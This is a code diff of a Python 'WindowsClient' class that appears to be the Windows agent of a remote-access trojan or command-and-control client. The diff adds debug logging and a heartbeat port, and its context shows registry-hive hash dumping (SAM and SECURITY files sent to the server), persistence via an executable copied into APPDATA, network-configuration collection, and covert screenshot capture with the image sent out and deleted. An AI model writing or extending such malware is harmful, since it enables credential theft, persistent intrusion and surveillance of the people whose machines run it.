@@ -19,14 +19,16 @@ class WindowsClient(Client):
     ####################################################################################################################
     ################################################# CONSTRUCTOR ######################################################
     ####################################################################################################################
-    def __init__(self, server_address, server_port):
-        super().__init__(server_address, server_port)
+    def __init__(self, server_address, server_port, server_beat_port, debug_mode):
+        super().__init__(server_address, server_port, server_beat_port, debug_mode)
+        self.debug_print("Windows Client Initialised")
 
     ####################################################################################################################
     ############################################## USUAL METHODS #######################################################
     ####################################################################################################################
 
     def persistence(self):
+        self.debug_print("PERSISTENCE", True)
         self.agent_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")
 
         # Check if Persistence is already in place
@@ -51,7 +53,7 @@ class WindowsClient(Client):
     ####################################################################################################################
 
     def hashdump(self, args):
-        print("In hashdump windows client")
+        self.debug_print("HASHDUMP", True)
 
         # Delete files if they exist to avoid entering in interactive mode
         self.delete_file(SAM_TEMP_PATH)
@@ -66,16 +68,19 @@ class WindowsClient(Client):
         self.send_file(SECURITY_TEMP_PATH)
 
     def ipconfig(self, args):
+        self.debug_print("IPCONFIG", True)
         output = subprocess.check_output("ipconfig /all", shell=True, text=True, encoding='utf-8', errors='ignore')
-        self.secure_sock.sendall(output.encode())
+        self.block_sending_data(output.encode())
 
     def screenshot(self, args):
+        self.debug_print("SCREENSHOT", True)
         appdata = os.getenv('APPDATA')
         screen_path = os.path.join(appdata, f"{secrets.token_hex(5)}.jpg")
 
         with mss.mss() as sct:
             screenshot = sct.grab(sct.monitors[0])
             mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
+            self.debug_print(f"screenshot saved at {screen_path}")
 
         self.send_file(screen_path)
         self.delete_file(screen_path)
